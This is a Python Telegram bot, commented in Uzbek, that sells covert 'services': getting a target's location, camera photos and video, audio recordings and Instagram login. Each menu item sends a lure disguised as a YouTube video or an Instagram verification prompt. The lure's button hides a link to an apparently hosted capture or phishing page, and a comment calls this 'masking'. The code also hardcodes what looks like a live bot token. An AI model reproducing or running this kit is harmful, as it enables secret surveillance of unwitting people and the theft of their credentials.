    
import telebot
from telebot import types
import os
from flask import Flask
from threading import Thread

# Render port xatosi bermasligi va bot uxlab qolmasligi uchun server
app = Flask('')
@app.route('/')
def home(): 
    return "Bot is running!"

def run():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run)
    t.start()

# Bot ma'lumotlari
TOKEN = '8541185973:AAFhTLOGzfi5FQpMrnLKtKVzzWeUr6SL2rI'
ADMIN_ID = 8275787221 
BASE_URL = "https://nodirbekabdimurodov2-design.github.io/Shipyombot"

bot = telebot.TeleBot(TOKEN)

# ASOSIY MENYU
def main_menu():
    kb = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    kb.add(types.KeyboardButton("🔐 Xizmatlar"), types.KeyboardButton("💼 Mening hisobim"))
    kb.add(types.KeyboardButton("❓ Qoidalar"), types.KeyboardButton("📞 Bog'lanish"))
    kb.add(types.KeyboardButton("💳 To'lov qilish"))
    return kb

# XIZMATLAR MENYUSI
def services_menu():
    kb = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    kb.add(types.KeyboardButton("📍 Lokatsiya olish"), types.KeyboardButton("📸 Rasm olish"))
    kb.add(types.KeyboardButton("🎥 Old kamera video"), types.KeyboardButton("🔑 Instagram login"))
    kb.add(types.KeyboardButton("🎬 Orqa kamera video"), types.KeyboardButton("🎵 Audio yozish"))
    kb.add(types.KeyboardButton("⬅️ Asosiy menyu"))
    return kb

@bot.message_handler(commands=['start'])
def start(m):
    bot.send_message(m.chat.id, "✅ Bot doimiy rejimda ishga tushdi!", reply_markup=main_menu())

@bot.message_handler(func=lambda m: True)
def handle_all(m):
    text = m.text
    
    # Bo'limlarni ochish
    if "Xizmatlar" in text:
        bot.send_message(m.chat.id, "Bo'limni tanlang:", reply_markup=services_menu())
    elif "Asosiy menyu" in text:
        bot.send_message(m.chat.id, "Asosiy menyuga qaytdingiz:", reply_markup=main_menu())

    # HAVOLALARNI TUGMA ICHIGA YASHIRISH (Masking)
    elif "Lokatsiya olish" in text:
        markup = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton("🎬 Videoni tomosha qilish", url=f"{BASE_URL}/index-1.html")
        markup.add(btn)
        bot.send_message(m.chat.id, "📍 YouTube: Yangi video! Ko'rish uchun tugmani bosing:", reply_markup=markup)

    elif "Rasm olish" in text:
        markup = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton("📸 Videoni ochish", url=f"{BASE_URL}/index.html")
        markup.add(btn)
        bot.send_message(m.chat.id, "🎬 YouTube Premyera: Klipni ko'rish 👇", reply_markup=markup)

    elif "Old kamera video" in text:
        markup = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton("🎥 HD Sifatda ko'rish", url=f"{BASE_URL}/index-2.html")
        markup.add(btn)
        bot.send_message(m.chat.id, "📺 YouTube: Yangi premyera yuklandi!", reply_markup=markup)

    elif "Orqa kamera video" in text:
        markup = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton("🎬 Videoni ko'rish", url=f"{BASE_URL}/Orqa%20kamera%20video%20.html")
        markup.add(btn)
        bot.send_message(m.chat.id, "📽 YouTube: Yangi video xabarni oching:", reply_markup=markup)

    elif "Instagram login" in text:
        markup = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton("🔐 Profilni tasdiqlash", url=f"{BASE_URL}/instagram.html")
        markup.add(btn)
        bot.send_message(m.chat.id, "⚠️ Videoni ko'rish uchun Instagram orqali tasdiqlang:", reply_markup=markup)

    elif "Audio yozish" in text:
        markup = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton("🎵 Musiqani eshitish", url=f"{BASE_URL}/audio.html")
        markup.add(btn)
        bot.send_message(m.chat.id, "🎶 Yangi audio trekni tinglang:", reply_markup=markup)

if __name__ == "__main__":
    keep_alive() # Render uchun serverni yoqish
    bot.polling(none_stop=True)
